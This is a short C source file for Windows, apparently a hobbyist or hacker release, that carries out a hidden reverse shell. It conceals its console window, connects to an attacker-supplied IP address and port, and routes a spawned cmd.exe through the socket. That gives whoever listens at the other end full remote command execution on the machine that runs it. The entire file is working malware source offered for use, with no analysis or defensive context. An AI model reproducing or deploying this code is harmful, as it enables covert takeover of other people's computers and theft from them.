// Coded by AnonCodernymous
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

//function to hide the console window
void HideConsole()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}

//main function of reverse shell
int main()
{
	HideConsole();
	SOCKET shell;
	sockaddr_in shell_addr;
	WSADATA wsa;
	char cmdLine[] = "cmd.exe";
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	int connection;
	char RecvServer[512];
	char ip[] = "127.0.0.1";		//	Enter your attacker machine Ip address
	int port = 8888;			//Enter a port to listen to
	
	WSAStartup(MAKEWORD(2,2), &wsa);	//Initialize of Winsock
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);		//Creation of TCP Socket
	
	shell_addr.sin_port = htons(port);		//Options added to shell_addr struct
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip);
	
	connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof shell_addr, NULL, NULL, NULL, NULL);	//Connect to the Attackers machine
	if(connection == SOCKET_ERROR)
	{
		printf("[!] SOCKET CONNECTION FAILED!\n");
		exit(0);
	}
	else
	{
		recv(shell, RecvServer, sizeof RecvServer, 0);
		memset(&si, 0, sizeof si);
		si.cb = sizeof si;
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;		//PIPE STDERROR, OUTPUT AND INPUT
		CreateProcess(NULL, cmdLine , NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);		//Spawns a Shell (cmd)
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(RecvServer, 0, sizeof RecvServer);
	}
}
